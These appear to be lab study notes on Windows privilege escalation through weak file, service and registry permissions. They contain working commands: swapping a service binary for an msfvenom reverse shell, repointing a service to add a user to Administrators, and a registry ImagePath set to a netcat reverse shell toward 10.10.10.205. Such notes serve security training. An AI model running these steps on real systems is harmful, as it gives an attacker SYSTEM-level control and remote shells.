# Weak Permissions

### Permissive File System ACLs

**Running SharpUp**

{% embed url="https://github.com/GhostPack/SharpUp/" %}
tools to check for service binaries suffering from weak ACLs.
{% endembed %}

```powershell-session
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

The tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

**Checking Permissions with icacls**

```powershell-session
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

`EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory meaning any unprivileged system user can manipulate the directory and its contents

**Replacing Service Binary**

with the msfvenom exe reverse shell.

```cmd-session
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

### Weak Service Permissions

**Reviewing SharpUp Again**

```cmd-session
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

**Checking Permissions with AccessChk**

[AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service.

```cmd-session
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

we can see that all Authenticated Users have [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights (full read/write)

* `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access).

**Check Local Admin Group**

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

**Changing the Service Binary Path**

```cmd-session
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

Start and stop service

```cmd-session
C:\htb> sc stop WindscribeService
C:\htb> sc start WindscribeService
```

**Confirming Local Admin Group Addition**

```cmd-session
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

### Weak Service Permissions - Cleanup

**Reverting the Binary Path**

```cmd-session
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```

**Starting the Service Again**

```cmd-session
C:\htb> sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
```

**Verifying Service is Running**

```cmd-session
C:\htb> sc query WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Unquoted Service Path

If the binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders.

**Service Binary Path**

```shell-session
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

* `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

**Querying Service**

```cmd-session
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.

* `C:\Program.exe\`
* `C:\Program Files (x86)\System.exe`

**Searching for Unquoted Service Paths**

```cmd-session
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

### Permissive Registry ACLs

**Checking for Weak Service ACLs in Registry**

```cmd-session
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP> 
```

**Changing ImagePath with PowerShell**

We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:

```powershell-session
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

### Modifiable Registry Autorun Binary

**Check Startup Programs**

Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```powershell-session
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

